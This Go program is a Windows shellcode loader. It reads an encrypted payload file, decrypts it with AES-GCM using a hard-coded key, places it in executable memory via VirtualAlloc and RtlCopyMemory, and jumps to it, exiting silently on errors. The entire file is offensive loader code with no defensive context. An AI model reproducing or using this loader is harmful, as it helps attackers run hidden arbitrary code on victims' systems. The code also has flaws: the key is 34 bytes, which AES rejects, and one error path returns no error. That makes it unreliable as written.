package main

import (
	"crypto/aes"
	"crypto/cipher"
	"log"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll    = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	// Load encrypted shellcode from file
	encryptedShellcode, err := os.ReadFile("shellcode.enc")
	if err != nil {
		log.Fatal(err)
	}

	// Decrypt shellcode
	key := []byte("thisis32byteslongpassphraseimusing") // Replace with the same key used for encryption
	shellcode, err := decrypt(key, encryptedShellcode)
	if err != nil {
		log.Fatal(err)
	}

	// Execute shellcode
	err = executeShellcode(shellcode)
	if err != nil {
		log.Fatal(err)
	}
}

func decrypt(key, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Create a new GCM cipher with the given key
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Extract the nonce from the ciphertext
	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, err
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// Decrypt the ciphertext using AES-GCM
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func executeShellcode(shellcode []byte) error {
	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}

	_, _, err = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}

	// jump to shellcode
	syscall.Syscall(addr, 0, 0, 0)
	return nil
}
